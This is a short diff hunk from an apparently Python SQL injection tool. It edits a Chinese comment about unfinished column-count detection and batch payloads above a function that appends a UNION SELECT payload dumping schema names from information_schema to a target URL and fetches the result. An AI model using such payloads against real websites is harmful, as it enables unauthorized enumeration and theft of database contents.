@@ -105,7 +105,7 @@ def sqlrep_back(html,payload_reps):
         return "sqlrep_back error"
 
 
-#爆库(这里还没有实现自动判断字段数)
+#爆库(这里还没有实现自动判断字段数，payload机制还待完善，可以实现一个批量payload))
 def BoomRepository(list,payload_reps):
     newurl = list + " union select 1,2,group_concat(schema_name) from information_schema.schemata --+"
     html = getHTMLText(newurl)
